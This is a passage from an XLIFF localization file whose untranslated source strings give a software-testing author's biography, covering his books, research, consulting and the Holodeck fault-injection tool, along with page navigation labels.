          <source>James is the author of &lt;span class="docEmphasis"&gt;How to Break Software&lt;/span&gt; (Addison-Wesley, 2002) and coauthor (with Hugh Thompson) of &lt;span class="docEmphasis"&gt;How to Break Software Security&lt;/span&gt; (Addison-Wesley, 2003), and over fifty peer-reviewed papers on software development and computer security. He holds patents on various inventions in software testing and defensive security applications and has attracted millions in funding, sponsorship, and license agreements while a professor at Florida Tech. He has also served as a testing and security consultant for Microsoft, IBM, Rational, and many other United States companies.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In 2001, James was appointed to Microsoft's Trustworthy Computing Academic Advisory Board and was named a &amp;quot;Top Scholar&amp;quot; by the editors of the &lt;span class="docEmphasis"&gt;Journal of Systems and Software&lt;/span&gt;, based on his research publications in software engineering. His research team at Florida Tech is known for its testing technologies and tools, which include the highly acclaimed runtime fault injection tool &lt;span class="docEmphasis"&gt;Holodeck&lt;/span&gt;. His research group is also well known for their development of exploits against software security, including cracking encryption, passwords and infiltrating protected networks via novel attacks against software defenses.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="pref02.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
    </body>
  </file>
</xliff>
